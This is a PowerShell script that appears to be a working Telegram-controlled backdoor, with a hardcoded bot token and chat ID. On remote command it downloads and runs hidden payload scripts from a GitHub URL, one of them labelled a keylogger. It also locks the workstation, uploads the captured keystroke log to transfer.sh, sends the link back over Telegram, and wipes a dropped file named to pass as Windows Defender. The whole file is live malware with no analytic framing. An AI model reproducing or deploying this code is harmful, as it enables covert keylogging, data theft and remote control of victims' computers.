# --- Config ---
$botToken = "7614493434:AAHDtLRMIO1EGCduKAAMxvwPdnHGyP2aP1U"
$chatID = "8065486104"
$payloadBaseURL = "https://raw.githubusercontent.com/Daiyu13/Payloadsforme/new/main/"  # Replace with your URL

# --- Cleanup Task (Runs on Reboot) ---
$cleanupScript = @"
schtasks /Create /TN "CleanupTask" /SC ONSTART /TR "powershell -Command Remove-Item '%TEMP%\WindowsDefender.exe'; schtasks /Delete /TN CleanupTask /F" /F
"@
Add-Content -Path "$env:TEMP\cleanup.ps1" -Value $cleanupScript
Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File $env:TEMP\cleanup.ps1" -WindowStyle Hidden

# --- Telegram Command Loop ---
while ($true) {
  try {
    $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/getUpdates"
    $latestCmd = $updates.result[-1].message.text

    switch -Wildcard ($latestCmd) {
      "1" { 
        # Run Script1.ps1 (Keylogger)
        Invoke-WebRequest -Uri "${payloadBaseURL}Script1.ps1" -OutFile "$env:TEMP\Script1.ps1"
        Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File $env:TEMP\Script1.ps1"
      }
      "2" { 
        # Lock Workstation
        rundll32.exe user32.dll,LockWorkStation
      }
      "3" { 
        # Run Script3.ps1 (Your Custom Action)
        Invoke-WebRequest -Uri "${payloadBaseURL}Script3.ps1" -OutFile "$env:TEMP\Script3.ps1"
        Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File $env:TEMP\Script3.ps1"
      }
      "kill" { 
        # Self-Destruct + Upload Logs
        $logPath = "$env:TEMP\keys.txt"
        $uploadURL = "https://transfer.sh/keys.txt"
        $response = Invoke-RestMethod -Uri $uploadURL -Method Put -InFile $logPath
        $downloadLink = $response.Trim()
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatID&text=Log+File:+$downloadLink"
        
        Remove-Item "$env:TEMP\WindowsDefender.exe" -Force
        Stop-Process -Id $PID 
      }
    }
    Start-Sleep -Seconds 10
  } catch { <# Ignore errors #> }
}
